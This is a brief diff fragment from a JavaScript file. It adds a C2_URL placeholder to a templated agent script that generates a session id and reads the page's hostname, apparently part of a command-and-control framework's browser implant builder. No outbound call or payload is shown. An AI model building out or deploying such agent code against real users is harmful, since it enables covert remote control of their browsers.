@@ -1520,6 +1520,7 @@ window.onload = () => {
 
 function initializeAgentLinks() {
     const agentCodeRaw = `(function(){
+        const C2_URL = '${C2_URL}';
         const sid = Math.random().toString(36).substr(2, 9);
         const host = window.location.hostname || 'local-file';
         
